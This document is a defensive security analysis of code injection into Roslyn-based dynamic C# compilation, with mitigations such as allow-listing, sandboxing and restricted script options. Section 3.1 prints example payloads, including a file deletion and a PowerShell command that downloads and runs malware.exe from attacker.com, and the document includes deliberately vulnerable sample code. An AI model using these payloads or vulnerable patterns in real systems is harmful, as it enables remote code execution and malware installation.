# Deep Analysis: Code Injection into Compilation (Roslyn)

## 1. Define Objective, Scope, and Methodology

### 1.1 Objective

The objective of this deep analysis is to thoroughly understand the "Code Injection into Compilation" attack surface in applications leveraging the Roslyn compiler platform.  This includes identifying specific vulnerabilities, assessing the impact of successful exploitation, and proposing concrete, actionable mitigation strategies beyond the high-level overview.  We aim to provide developers with practical guidance to secure their Roslyn-based applications.

### 1.2 Scope

This analysis focuses specifically on scenarios where Roslyn is used to compile C# or VB.NET code, and where user-provided input, directly or indirectly, influences the code being compiled.  This includes, but is not limited to:

*   Web applications with "live code evaluation" features.
*   Applications generating code from user-defined templates.
*   Tools that dynamically create or modify code based on user input.
*   Systems that use Roslyn to process scripts or plugins provided by users.
*   Applications using Roslyn for macro expansion or code generation based on user-provided data.

We will *not* cover scenarios where Roslyn is used solely for internal code analysis or compilation of trusted, developer-controlled code.  We also won't delve into general .NET security best practices unrelated to Roslyn's compilation capabilities.

### 1.3 Methodology

The analysis will follow these steps:

1.  **Attack Surface Decomposition:** Break down the attack surface into specific attack vectors and scenarios.
2.  **Vulnerability Analysis:** Identify potential vulnerabilities within each scenario, considering Roslyn's API and features.
3.  **Exploitation Analysis:** Describe how an attacker could exploit identified vulnerabilities, including example code snippets.
4.  **Impact Assessment:**  Reiterate and expand upon the potential impact of successful exploitation.
5.  **Mitigation Strategy Deep Dive:** Provide detailed, practical mitigation strategies, including code examples and configuration recommendations where applicable.  This will go beyond the initial high-level mitigations.
6.  **Residual Risk Assessment:**  Identify any remaining risks after implementing the mitigation strategies.

## 2. Attack Surface Decomposition

We can decompose the "Code Injection into Compilation" attack surface into the following key scenarios:

*   **Direct Code Injection:** User input is directly used as part of the source code to be compiled.  This is the most obvious and dangerous scenario.
*   **Indirect Code Injection (Templating):** User input is inserted into a template, which is then used to generate the source code.  This introduces the risk of template injection vulnerabilities.
*   **Indirect Code Injection (Data-Driven):** User-provided data (e.g., from a database or configuration file) is used to construct the code to be compiled.  This is less direct but still poses a significant risk.
*   **API Misuse:**  Incorrect usage of Roslyn's APIs, such as providing untrusted data to methods that expect trusted code, can lead to vulnerabilities.

## 3. Vulnerability Analysis

### 3.1 Direct Code Injection

*   **Vulnerability:**  Directly concatenating user input into a string that is then passed to Roslyn for compilation.
*   **Example (Vulnerable Code):**

    ```csharp
    using Microsoft.CodeAnalysis.CSharp.Scripting;
    using Microsoft.CodeAnalysis.Scripting;

    public class VulnerableCode
    {
        public async Task<object> EvaluateUserInput(string userInput)
        {
            try
            {
                // DANGER: Directly using user input in the script!
                return await CSharpScript.EvaluateAsync(userInput);
            }
            catch (CompilationErrorException e)
            {
                // Handle compilation errors (but the damage might already be done)
                Console.WriteLine(e.Message);
                return null;
            }
        }
    }
    ```

    An attacker could provide input like: `"; System.IO.File.Delete(\"C:\\important_file.txt\"); //"` to delete a file.  Or, more maliciously: `"; System.Diagnostics.Process.Start(\"powershell.exe\", \"-Command Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile C:\\malware.exe; C:\\malware.exe\"); //"`

### 3.2 Indirect Code Injection (Templating)

*   **Vulnerability:** Using a template engine that doesn't properly escape user input, allowing attackers to inject code into the template itself.
*   **Example (Vulnerable - Conceptual):**

    Imagine a template like this: `string message = "Hello, {{username}}!";`  If `username` is not properly escaped, an attacker could provide a value like `{{username}}!"; System.Diagnostics.Process.Start("calc.exe"); //`, leading to code execution.  This is *not* Roslyn-specific, but it becomes a Roslyn vulnerability when the *output* of the template engine is fed to Roslyn.

### 3.3 Indirect Code Injection (Data-Driven)

*   **Vulnerability:**  Constructing code based on data retrieved from a database, configuration file, or other external source without proper validation.
*   **Example (Vulnerable - Conceptual):**

    ```csharp
    // Assume 'className' and 'methodBody' are read from a database.
    string className = GetClassNameFromDatabase();
    string methodBody = GetMethodBodyFromDatabase();

    string code = $@"
    public class {className}
    {{
        public void Execute()
        {{
            {methodBody}
        }}
    }}";

    // Compile and execute the code...
    ```

    If an attacker can modify the database entries, they can inject arbitrary code into `methodBody`.

### 3.4 API Misuse

*   **Vulnerability:** Using Roslyn APIs in an insecure way, such as passing untrusted code to methods designed for trusted input.  For example, using `CSharpSyntaxTree.ParseText` with user-provided input without any validation.
*   **Example (Vulnerable):**
    ```csharp
     using Microsoft.CodeAnalysis;
    using Microsoft.CodeAnalysis.CSharp;
    public class VulnerableApi
    {
        public SyntaxTree ParseUserInput(string userInput)
        {
            //DANGER: Parsing unvalidated user input
            return CSharpSyntaxTree.ParseText(userInput);
        }
    }
    ```

## 4. Exploitation Analysis

Exploitation typically involves crafting malicious input that leverages the identified vulnerabilities.  The attacker's goal is to inject code that performs actions beyond the intended functionality of the application.  This can include:

*   **Executing System Commands:**  Using `System.Diagnostics.Process.Start` to run arbitrary commands.
*   **Accessing Files:**  Reading, writing, or deleting files using `System.IO`.
*   **Network Access:**  Making network connections, downloading files, or sending data using `System.Net`.
*   **Reflective Loading:**  Loading and executing arbitrary assemblies using reflection.
*   **Creating new process:** Using `System.Diagnostics.Process` to create new process.
*   **Accessing and modifying memory:** Using unsafe code to access and modify memory.

The attacker can chain these actions together to achieve complex and damaging results.

## 5. Mitigation Strategy Deep Dive

### 5.1 Strict Input Validation (Allow-Listing)

*   **Principle:**  Instead of trying to block *bad* input (blacklisting), define a strict set of *allowed* input (whitelisting or allow-listing).
*   **Implementation:**
    *   **Regular Expressions (with caution):** Use regular expressions to enforce a strict format for user input.  However, complex regular expressions can be difficult to get right and can themselves be vulnerable to ReDoS (Regular Expression Denial of Service) attacks.  Keep them as simple as possible.
        ```csharp
        // Example: Allow only alphanumeric characters and spaces, up to 50 characters.
        Regex allowedInputRegex = new Regex(@"^[a-zA-Z0-9\s]{1,50}$");

        if (!allowedInputRegex.IsMatch(userInput))
        {
            // Reject input
        }
        ```
    *   **Character Allow Lists:**  Define a list of allowed characters and reject any input containing other characters.
        ```csharp
        string allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ";
        if (userInput.Any(c => !allowedChars.Contains(c)))
        {
            // Reject input
        }
        ```
    *   **Syntax Validation (Pre-Compilation):**  Use Roslyn itself to *parse* the user input *without compiling it*.  This allows you to check the syntax and identify potentially malicious constructs *before* attempting to compile.
        ```csharp
        using Microsoft.CodeAnalysis;
        using Microsoft.CodeAnalysis.CSharp;

        public bool IsSafeCode(string userInput)
        {
            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(userInput);
            var diagnostics = syntaxTree.GetDiagnostics();

            // Check for any errors (basic syntax check).
            if (diagnostics.Any(d => d.Severity == DiagnosticSeverity.Error))
            {
                return false; // Syntax error
            }

            // Perform more advanced checks (e.g., disallow certain method calls).
            var root = syntaxTree.GetRoot();
            var invocations = root.DescendantNodes().OfType<InvocationExpressionSyntax>();
            foreach (var invocation in invocations)
            {
                if (invocation.Expression.ToString() == "System.Diagnostics.Process.Start")
                {
                    return false; // Disallowed method call
                }
                // Add more checks as needed...
            }

            return true; // Code appears safe (but still sandbox it!)
        }
        ```

### 5.2 Sandboxing

*   **Principle:** Execute the compiled code in a restricted environment that limits its access to system resources.
*   **Implementation:**
    *   **AppDomains (Legacy .NET Framework):**  Create a separate AppDomain with limited permissions.  This is a legacy approach and is not recommended for .NET (Core) or .NET 5+.
    *   **Containers (Docker, etc.):**  Run the compiled code within a container.  This provides excellent isolation and is the recommended approach for modern .NET applications.  You can configure the container to have limited network access, file system access, and other privileges.
    *   **Virtual Machines:**  Run the compiled code within a virtual machine.  This provides the highest level of isolation but is also the most resource-intensive.
    *   **.NET Code Access Security (CAS) - Deprecated:** CAS was a mechanism for restricting the permissions of .NET code.  However, it has been deprecated in .NET (Core) and .NET 5+ and is *not* recommended for new development.
    *  **Restricted `CSharpScript` Options:** When using `CSharpScript`, you can use `ScriptOptions` to restrict access to namespaces and assemblies.
        ```csharp
        using Microsoft.CodeAnalysis.CSharp.Scripting;
        using Microsoft.CodeAnalysis.Scripting;

        var options = ScriptOptions.Default
            .WithReferences(typeof(object).Assembly) // Only allow System
            .WithImports("System"); // Only allow System namespace

        var result = await CSharpScript.EvaluateAsync("2 + 2", options); // Allowed
        // var result = await CSharpScript.EvaluateAsync("System.IO.File.ReadAllText(\"...\")", options); // Compilation error!
        ```

### 5.3 Avoid Dynamic Compilation (if possible)

*   **Principle:** If the application's functionality can be achieved without dynamic compilation, this eliminates the attack surface entirely.
*   **Implementation:**  Consider alternative approaches, such as:
    *   **Interpreted Languages:**  If you need to execute user-provided scripts, consider using a safer, interpreted language (e.g., Lua, Python with a restricted environment) instead of compiling C#.
    *   **Configuration Files:**  Use configuration files (e.g., JSON, YAML) to store user-defined settings instead of generating code.
    *   **Pre-compiled Plugins:**  Allow users to provide functionality through pre-compiled plugins (DLLs) that are loaded with restricted permissions.

### 5.4 Template Engine Security

*   **Principle:** If using a template engine, ensure it's secure and user input is properly escaped *within the template*.
*   **Implementation:**
    *   **Use a Secure Template Engine:** Choose a template engine that automatically escapes user input by default (e.g., Razor in ASP.NET Core).
    *   **Manual Escaping:** If using a template engine that doesn't automatically escape input, manually escape all user-provided values before inserting them into the template.
    *   **Context-Aware Escaping:**  Use escaping functions that are appropriate for the context (e.g., HTML escaping for HTML output, JavaScript escaping for JavaScript output).

### 5.5 Code Signing (Post-Compilation)

*   **Principle:** Digitally sign the compiled assembly to detect tampering *after* compilation.  This doesn't prevent code injection, but it helps detect if the compiled code has been modified.
*   **Implementation:** Use the .NET SDK tools to sign the assembly after compilation.

### 5.6 Allow Lists (Whitelisting) - Advanced

* **Principle:** Define a strict allow list of permitted code constructs, libraries, and APIs at the Roslyn API level.
* **Implementation:** Use Roslyn's semantic analysis capabilities to inspect the compiled code *before* execution and reject it if it contains disallowed elements. This is a more advanced technique that requires a deeper understanding of Roslyn's API.
    ```csharp
    // Example (Conceptual):
    // 1. Compile the code.
    // 2. Get the Compilation object.
    // 3. Use the Compilation object to get the SemanticModel.
    // 4. Use the SemanticModel to analyze the code and check for disallowed symbols (e.g., System.Diagnostics.Process).
    // 5. If disallowed symbols are found, reject the code.
    ```

## 6. Residual Risk Assessment

Even with all these mitigations in place, some residual risk remains:

*   **Zero-Day Vulnerabilities:**  There's always the possibility of undiscovered vulnerabilities in Roslyn itself or in the .NET runtime.
*   **Sandboxing Escapes:**  Sophisticated attackers might find ways to escape the sandbox environment.
*   **Complex Validation Errors:**  It's difficult to guarantee that input validation is 100% foolproof, especially for complex code structures.
*   **Misconfiguration:**  The mitigations might be implemented incorrectly or incompletely.

Therefore, a defense-in-depth approach is crucial.  Regular security audits, penetration testing, and staying up-to-date with security patches are essential to minimize the remaining risk. Continuous monitoring of the application's behavior can also help detect and respond to potential attacks.

This detailed analysis provides a comprehensive understanding of the "Code Injection into Compilation" attack surface when using Roslyn. By implementing the recommended mitigation strategies, developers can significantly reduce the risk of this critical vulnerability. Remember that security is an ongoing process, and continuous vigilance is required.
